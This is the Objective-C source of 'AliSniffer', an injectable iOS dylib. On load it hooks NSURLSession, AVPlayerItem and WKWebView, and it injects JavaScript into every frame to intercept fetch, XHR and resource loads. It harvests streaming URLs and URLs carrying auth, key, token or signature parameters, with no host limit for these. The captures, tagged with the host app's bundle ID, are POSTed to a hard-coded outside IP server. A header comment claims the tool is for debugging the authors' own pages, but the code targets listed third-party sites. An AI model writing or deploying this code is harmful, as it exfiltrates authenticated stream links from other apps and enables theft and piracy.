// AliSniffer.m (popup-only + response scan + report-to-server)
// 仅用于你们自有页面/自有服务器的调试抓取（微信内 H5 / WKWebView / NSURLSession / AVPlayer）。
// 编译：-fobjc-arc，arm64，iOS 11+，dylib
#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#import <AVFoundation/AVFoundation.h>
#import <objc/runtime.h>

#pragma mark - 上报配置（你要改成自己的）

static NSString * const kPushRawEndpoint  = @"http://139.155.57.242:8088/api/push_raw";
static NSString * const kPushFormEndpoint = @"http://139.155.57.242:8088/api/push_form";
static NSString * const kPushToken        = @"@yy166431";

#pragma mark - Config

// 只在这些 host 命中时：标记“已进入页面”，从此开始抓取
static NSArray<NSString *> *AS_TargetHosts(void) {
    return @[
        @"ced.wtyibxc.cn",
        @"app.kuniunet.com",
        @"m.inmuu.com",
        // @"your.domain.com",
    ];
}

// 你当前需要看更多：NO 会把“接口”也抓出来（但我们仍然只在进入目标页面后才开始抓）
// 注意：媒体 URL 会不限制 host（防止 CDN 漏抓）
static BOOL AS_OnlyMediaURLs = NO;

// 弹窗：1=命中时弹窗+复制；0=完全静默（只上报服务器+NSLog）
#ifndef SNIFFER_ENABLE_POPUP
#define SNIFFER_ENABLE_POPUP 1
#endif

// 上报：1=上报到服务器；0=不上传
#ifndef SNIFFER_ENABLE_REPORT
#define SNIFFER_ENABLE_REPORT 1
#endif

#pragma mark - Utils

static BOOL AS_IsPushURL(NSURL *u) {
    if (!u) return NO;
    NSString *s = u.absoluteString ?: @"";
    if ([s hasPrefix:kPushRawEndpoint] || [s hasPrefix:kPushFormEndpoint]) return YES;
    if ([u.host isEqualToString:@"139.155.57.242"]) return YES;
    return NO;
}

/**
 你原来这样写是不对的：
   "\\key"、"\\auth" 会被当成“转义序列”，并且正则里也不是你想要的含义。
 正确写法：
   - 如果想匹配单词 key/auth：直接写 "key" / "auth"
   - 如果想匹配查询参数：写 "[?&]key=" / "[?&]auth_key=" 这类
*/
static BOOL AS_IsMediaURL(NSString *u) {
    if (!u.length) return NO;
    static NSRegularExpression *re = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        // 规则：
        // 1) 常见媒体扩展名：m3u8/ts/m4s/mpd/mp4/flv
        // 2) 直播常见鉴权参数：auth/auth_key/key/token/sign/expires 等（只要 URL 里带这些就视为“关键”）
        // 3) rtmp / ws flv
        NSString *pat =
        @"(?i)("
          "\\.m3u8(\\?|$)|"
          "\\.mpd(\\?|$)|"
          "\\.m4s(\\?|$)|"
          "\\.ts(\\?|$)|"
          "\\.mp4(\\?|$)|"
          "\\.flv(\\?|$)|"
          "[?&](auth_key|auth|key|token|sign|signature|expires|expire|st|wsSecret|wsTime|authKey|authkey)=|"
          "/auth/|/key/|"
          "^rtmps?:\\/\\/|"
          "^wss?:\\/\\/.*\\.flv"
        ")";
        re = [NSRegularExpression regularExpressionWithPattern:pat options:0 error:nil];
    });
    return [re numberOfMatchesInString:u options:0 range:NSMakeRange(0, u.length)] > 0;
}

static BOOL AS_HostMatched(NSString *host) {
    if (!host.length) return NO;
    for (NSString *h in AS_TargetHosts()) {
        if ([host isEqualToString:h]) return YES;
        if ([host hasSuffix:[@"." stringByAppendingString:h]]) return YES;
    }
    return NO;
}

static NSString *AS_BundleID(void) {
    return NSBundle.mainBundle.bundleIdentifier ?: @"";
}

static NSString *AS_NowString(void) {
    NSDateFormatter *df = [NSDateFormatter new];
    df.dateFormat = @"yyyy-MM-dd HH:mm:ss";
    return [df stringFromDate:[NSDate date]];
}

#pragma mark - State

static BOOL gAS_Enabled = YES;              // 不需要开关：默认一直开
static BOOL gAS_EnteredTargetPage = NO;     // 进入目标 host 后置为 YES
static NSMutableSet<NSString *> *gAS_Once = nil;

static BOOL AS_Once(NSString *key) {
    if (!key.length) return NO;
    if (!gAS_Once) gAS_Once = [NSMutableSet set];
    if ([gAS_Once containsObject:key]) return NO;
    [gAS_Once addObject:key];
    if (gAS_Once.count > 800) [gAS_Once removeAllObjects];
    return YES;
}

#pragma mark - Popup

static UIViewController *AS_TopVC(void) {
    UIWindow *key = UIApplication.sharedApplication.keyWindow;
    UIViewController *vc = key.rootViewController ?: UIApplication.sharedApplication.delegate.window.rootViewController;
    while (vc.presentedViewController) vc = vc.presentedViewController;
    return vc;
}

static NSTimeInterval gAS_LastAlertTS = 0;

static void AS_ShowAlert(NSString *title, NSString *message, BOOL allowCopy) {
#if SNIFFER_ENABLE_POPUP
    dispatch_async(dispatch_get_main_queue(), ^{
        UIViewController *vc = AS_TopVC();
        if (!vc) return;

        NSTimeInterval now = [NSDate date].timeIntervalSince1970;
        if (now - gAS_LastAlertTS < 0.5) return; // 0.5s 内只弹一次
        gAS_LastAlertTS = now;

        if (vc.presentedViewController && [vc.presentedViewController isKindOfClass:[UIAlertController class]]) return;

        UIAlertController *ac = [UIAlertController alertControllerWithTitle:title ?: @"AliSniffer"
                                                                    message:message ?: @""
                                                             preferredStyle:UIAlertControllerStyleAlert];
        if (allowCopy) {
            [ac addAction:[UIAlertAction actionWithTitle:@"复制" style:UIAlertActionStyleDefault handler:^(__unused UIAlertAction *a){
                UIPasteboard.generalPasteboard.string = message ?: @"";
            }]];
        }
        [ac addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
        [vc presentViewController:ac animated:YES completion:nil];
    });
#else
    (void)title; (void)message; (void)allowCopy;
#endif
}

#pragma mark - Report to server

static void AS_ReportToServer(NSString *type, NSString *payload) {
#if SNIFFER_ENABLE_REPORT
    if (!payload.length) return;
    if (!kPushRawEndpoint.length) return;

    NSURL *url = [NSURL URLWithString:kPushRawEndpoint];
    if (!url) return;

    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
    req.HTTPMethod = @"POST";
    [req setValue:@"application/json; charset=utf-8" forHTTPHeaderField:@"Content-Type"];

    NSDictionary *body = @{
        @"token": kPushToken ?: @"",
        @"type": type ?: @"",
        @"bundle": AS_BundleID(),
        @"time": AS_NowString(),
        @"data": payload ?: @""
    };

    req.HTTPBody = [NSJSONSerialization dataWithJSONObject:body options:0 error:nil];

    NSURLSessionDataTask *t = [[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(__unused NSData *d, __unused NSURLResponse *r, __unused NSError *e) {}];
    [t resume];
#else
    (void)type; (void)payload;
#endif
}

#pragma mark - Core capture decision

static BOOL AS_ShouldCaptureURL(NSURL *url) {
    if (!gAS_Enabled || !url) return NO;
    if (AS_IsPushURL(url)) return NO;
    if (!gAS_EnteredTargetPage) return NO;

    NSString *u = url.absoluteString ?: @"";
    BOOL isMedia = AS_IsMediaURL(u);

    if (AS_OnlyMediaURLs) {
        return isMedia;
    } else {
        if (isMedia) return YES; // 命中(媒体/鉴权参数) 不限制 host
        return AS_HostMatched(url.host ?: @"");
    }
}

#pragma mark - Response scan

static void AS_ScanResponseForMedia(NSURL *reqURL, NSData *data, NSString *srcTag) {
    if (!gAS_EnteredTargetPage) return;
    if (!data.length) return;
    if (data.length > 400 * 1024) return;

    NSString *s = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
    if (!s.length) return;

    BOOL maybe =
        ([s rangeOfString:@"m3u8" options:NSCaseInsensitiveSearch].location != NSNotFound) ||
        ([s rangeOfString:@".ts" options:NSCaseInsensitiveSearch].location != NSNotFound) ||
        ([s rangeOfString:@"auth" options:NSCaseInsensitiveSearch].location != NSNotFound) ||
        ([s rangeOfString:@"auth_key" options:NSCaseInsensitiveSearch].location != NSNotFound) ||
        ([s rangeOfString:@"key=" options:NSCaseInsensitiveSearch].location != NSNotFound) ||
        ([s rangeOfString:@"token" options:NSCaseInsensitiveSearch].location != NSNotFound) ||
        ([s rangeOfString:@"flv" options:NSCaseInsensitiveSearch].location != NSNotFound) ||
        ([s rangeOfString:@"rtmp" options:NSCaseInsensitiveSearch].location != NSNotFound);

    if (!maybe) return;

    static NSRegularExpression *urlRe = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        urlRe = [NSRegularExpression regularExpressionWithPattern:@"(https?:\\\\/\\\\/[^\\s\"'<>]+|rtmps?:\\\\/\\\\/[^\\s\"'<>]+)"
                                                          options:0 error:nil];
    });

    NSArray<NSTextCheckingResult *> *ms = [urlRe matchesInString:s options:0 range:NSMakeRange(0, s.length)];
    for (NSTextCheckingResult *m in ms) {
        if (m.numberOfRanges < 2) continue;
        NSString *u = [s substringWithRange:[m rangeAtIndex:1]];
        if (!AS_IsMediaURL(u)) continue;

        NSString *key = [NSString stringWithFormat:@"RESP:%@", u];
        if (!AS_Once(key)) continue;

        NSString *line = [NSString stringWithFormat:@"FOUND_IN_RESPONSE(%@)\nREQ=%@\nHIT=%@",
                          srcTag ?: @"resp", reqURL.absoluteString ?: @"", u];
        NSLog(@"[AliSniffer] %@", line);
        AS_ReportToServer(@"FOUND_MEDIA", line);
        AS_ShowAlert(@"AliSniffer 命中(响应)", line, YES);
    }
}

#pragma mark - Swizzle helper

static void AS_Swizzle(Class c, SEL sel, IMP newImp, IMP *origOut) {
    if (!c) return;
    Method m = class_getInstanceMethod(c, sel);
    if (!m) return;
    if (origOut) *origOut = method_getImplementation(m);
    method_setImplementation(m, newImp);
}

#pragma mark - NSURLSession hooks

static id (*orig_dataTaskWithRequest_completion)(id, SEL, NSURLRequest *, void(^)(NSData*, NSURLResponse*, NSError*));
static id swz_dataTaskWithRequest_completion(id self, SEL _cmd, NSURLRequest *request, void(^completion)(NSData*, NSURLResponse*, NSError*)) {

    void (^wrapped)(NSData*, NSURLResponse*, NSError*) = ^(NSData *data, NSURLResponse *resp, NSError *err) {
        @try {
            if (request.URL && AS_ShouldCaptureURL(request.URL)) {
                NSString *u = request.URL.absoluteString ?: @"";
                NSString *key = [NSString stringWithFormat:@"REQ:%@", u];
                if (AS_Once(key)) {
                    NSString *line = [NSString stringWithFormat:@"REQ %@\n%@", request.HTTPMethod ?: @"GET", u];
                    NSLog(@"[AliSniffer] %@", line);
                    AS_ReportToServer(@"REQ_URL", line);
                    AS_ShowAlert(@"AliSniffer 请求", line, YES);
                }
            }
            AS_ScanResponseForMedia(request.URL, data, @"NSURLSession");
        } @catch(...) {}

        if (completion) completion(data, resp, err);
    };

    return orig_dataTaskWithRequest_completion ? orig_dataTaskWithRequest_completion(self, _cmd, request, wrapped) : nil;
}

static void (*orig_task_resume)(id, SEL);
static void swz_task_resume(id self, SEL _cmd) {
    @try {
        NSURLRequest *r = nil;
        @try { r = [self respondsToSelector:@selector(currentRequest)] ? [self performSelector:@selector(currentRequest)] : nil; } @catch(...) {}

        if (r.URL && AS_ShouldCaptureURL(r.URL)) {
            NSString *u = r.URL.absoluteString ?: @"";
            if (AS_IsMediaURL(u)) {
                NSString *key = [NSString stringWithFormat:@"MEDIA_REQ:%@", u];
                if (AS_Once(key)) {
                    NSString *line = [NSString stringWithFormat:@"HIT(MEDIA_REQ)\n%@", u];
                    NSLog(@"[AliSniffer] %@", line);
                    AS_ReportToServer(@"MEDIA_REQ", line);
                    AS_ShowAlert(@"AliSniffer 命中(媒体请求)", line, YES);
                }
            }
        }
    } @catch(...) {}
    if (orig_task_resume) orig_task_resume(self, _cmd);
}

__attribute__((constructor))
static void AS_InstallSessionHooks(void) {
    @autoreleasepool {
        Class S = NSClassFromString(@"NSURLSession");
        if (S) {
            AS_Swizzle(S,
                       @selector(dataTaskWithRequest:completionHandler:),
                       (IMP)swz_dataTaskWithRequest_completion,
                       (IMP *)&orig_dataTaskWithRequest_completion);
        }
        Class T = NSClassFromString(@"NSURLSessionTask");
        if (T) AS_Swizzle(T, @selector(resume), (IMP)swz_task_resume, (IMP *)&orig_task_resume);

        AS_ShowAlert(@"AliSniffer", @"注入成功（开始等待进入目标页面…）", NO);
        NSLog(@"[AliSniffer] hooks installed");
    }
}

#pragma mark - AVPlayerItem AccessLog (兜底)

static void AS_ObserveAccessLog(AVPlayerItem *item) {
    if (!item) return;
    @try {
        [[NSNotificationCenter defaultCenter] addObserverForName:AVPlayerItemNewAccessLogEntryNotification
                                                          object:item
                                                           queue:[NSOperationQueue mainQueue]
                                                      usingBlock:^(__unused NSNotification *note) {
            @try {
                if (!gAS_Enabled || !gAS_EnteredTargetPage) return;
                AVPlayerItemAccessLog *log = item.accessLog;
                id ev = log.events.lastObject;
                NSString *uri = nil;
                if ([ev respondsToSelector:NSSelectorFromString(@"URI")]) uri = [ev valueForKey:@"URI"];
                if (!uri.length) return;

                if (AS_IsMediaURL(uri)) {
                    NSString *key = [NSString stringWithFormat:@"AV:%@", uri];
                    if (!AS_Once(key)) return;
                    NSString *line = [NSString stringWithFormat:@"HIT(AVAccessLog)\n%@", uri];
                    NSLog(@"[AliSniffer] %@", line);
                    AS_ReportToServer(@"AV_URI", line);
                    AS_ShowAlert(@"AliSniffer 命中(AVPlayer)", line, YES);
                }
            } @catch(...) {}
        }];
    } @catch(...) {}
}

static id (*orig_item_initWithURL)(id, SEL, NSURL *);
static id swz_item_initWithURL(id self, SEL _cmd, NSURL *URL) {
    id item = orig_item_initWithURL ? orig_item_initWithURL(self, _cmd, URL) : nil;
    if (item) AS_ObserveAccessLog((AVPlayerItem *)item);
    return item;
}

__attribute__((constructor))
static void AS_InstallAVHooks(void) {
    @autoreleasepool {
        Class C = NSClassFromString(@"AVPlayerItem");
        Method m = class_getInstanceMethod(C, @selector(initWithURL:));
        if (m) {
            orig_item_initWithURL = (void *)method_getImplementation(m);
            method_setImplementation(m, (IMP)swz_item_initWithURL);
        }
        NSLog(@"[AliSniffer] AV hooks installed");
    }
}

#pragma mark - WKWebView inject (resource sniff + mark entered)

@interface ASWKHandler : NSObject <WKScriptMessageHandler> @end
@implementation ASWKHandler
- (void)userContentController:(WKUserContentController *)uc didReceiveScriptMessage:(WKScriptMessage *)m {
    if (![m.name isEqualToString:@"_AS"]) return;
    if (![m.body isKindOfClass:[NSDictionary class]]) return;

    NSDictionary *d = (NSDictionary *)m.body;
    NSString *t = d[@"t"];
    NSString *u = d[@"u"];
    if (!u.length) return;
    if (!gAS_EnteredTargetPage) return;

    if (AS_IsMediaURL(u)) {
        NSString *key = [NSString stringWithFormat:@"WK:%@", u];
        if (!AS_Once(key)) return;
        NSString *line = [NSString stringWithFormat:@"HIT(WK-%@)\n%@", t ?: @"res", u];
        NSLog(@"[AliSniffer] %@", line);
        AS_ReportToServer(@"WK_HIT", line);
        AS_ShowAlert(@"AliSniffer 命中(WKWebView)", line, YES);
    }
}
@end

static void AS_AddWKScripts(WKWebViewConfiguration *cfg) {
    if (!cfg) return;
    static void *kKey = &kKey;
    if (objc_getAssociatedObject(cfg, kKey)) return;
    objc_setAssociatedObject(cfg, kKey, @YES, OBJC_ASSOCIATION_RETAIN_NONATOMIC);

    ASWKHandler *h = [ASWKHandler new];
    @try { [cfg.userContentController addScriptMessageHandler:h name:@"_AS"]; } @catch (...) {}

    NSData *json = [NSJSONSerialization dataWithJSONObject:AS_TargetHosts() options:0 error:nil];
    NSString *targets = [[NSString alloc] initWithData:json encoding:NSUTF8StringEncoding] ?: @"[]";

    NSString *js =
    [NSString stringWithFormat:
     @"(function(){try{"
      "function post(t,u){try{window.webkit.messageHandlers._AS.postMessage({t:t,u:String(u||'')});}catch(e){}}"
      "function host(){try{return location.host||'';}catch(e){return ''}}"
      "function matchHost(){var h=host();var targets=%@;for(var i=0;i<targets.length;i++){var th=targets[i];if(h===th||h.endsWith('.'+th))return true;}return false;}"
      "if(matchHost()) { post('page', location.href); }"
      "var _push=history.pushState;history.pushState=function(){var r=_push.apply(this,arguments);try{if(matchHost())post('nav',location.href);}catch(e){}return r;};"
      "window.addEventListener('popstate',function(){try{if(matchHost())post('nav',location.href);}catch(e){}});"
      "if(window.fetch){var _f=window.fetch;window.fetch=function(){try{post('fetch_req',arguments[0]);}catch(e){}"

        "return _f.apply(this,arguments).then(function(r){try{if(r&&r.url)post('fetch_res',r.url);}catch(e){}return r;});};}"
      "if(window.XMLHttpRequest){var X=window.XMLHttpRequest;var o=X.prototype.open;X.prototype.open=function(m,u){try{post('xhr_open',u);}catch(e){}return o.apply(this,arguments);};}"
      "setInterval(function(){try{var es=performance.getEntriesByType('resource')||[];"

        "for(var i=Math.max(0,es.length-30);i<es.length;i++){var e=es[i];if(e&&e.name)post('perf',e.name);}"

      "}catch(e){}},1100);"
     "}catch(e){}})();", targets];

    WKUserScript *sc = [[WKUserScript alloc] initWithSource:js
                                              injectionTime:WKUserScriptInjectionTimeAtDocumentStart
                                           forMainFrameOnly:NO];
    @try { [cfg.userContentController addUserScript:sc]; } @catch (...) {}
}

static id (*orig_wk_init_frame)(id, SEL, CGRect, WKWebViewConfiguration *);
static id swz_wk_init_frame(id self, SEL _cmd, CGRect frame, WKWebViewConfiguration *cfg) {
    if (cfg) AS_AddWKScripts(cfg);
    return orig_wk_init_frame(self, _cmd, frame, cfg);
}

static void (*orig_wk_loadRequest)(id, SEL, NSURLRequest *);
static void swz_wk_loadRequest(WKWebView *self, SEL _cmd, NSURLRequest *req) {
    @try {
        NSString *host = req.URL.host ?: @"";
        if (AS_HostMatched(host) && !gAS_EnteredTargetPage) {
            gAS_EnteredTargetPage = YES;
            NSString *msg = [NSString stringWithFormat:@"进入页面：%@\n开始抓取：\n- 命中(媒体/鉴权参数) 不限制 host（防止 CDN 漏抓）\n- 也会扫描接口响应提取 m3u8/ts/带 key/auth 的 URL", host];
            AS_ReportToServer(@"ENTER_PAGE", msg);
            AS_ShowAlert(@"AliSniffer", msg, NO);
        }
    } @catch(...) {}
    if (orig_wk_loadRequest) orig_wk_loadRequest(self, _cmd, req);
}

__attribute__((constructor))
static void AS_InstallWKHooks(void) {
    @autoreleasepool {
        Class C = NSClassFromString(@"WKWebView");
        if (!C) return;

        Method m1 = class_getInstanceMethod(C, @selector(initWithFrame:configuration:));
        if (m1) {
            orig_wk_init_frame = (void *)method_getImplementation(m1);
            method_setImplementation(m1, (IMP)swz_wk_init_frame);
        }

        Method m2 = class_getInstanceMethod(C, @selector(loadRequest:));
        if (m2) {
            orig_wk_loadRequest = (void *)method_getImplementation(m2);
            method_setImplementation(m2, (IMP)swz_wk_loadRequest);
        }

        NSLog(@"[AliSniffer] WK hooks installed");
    }
}
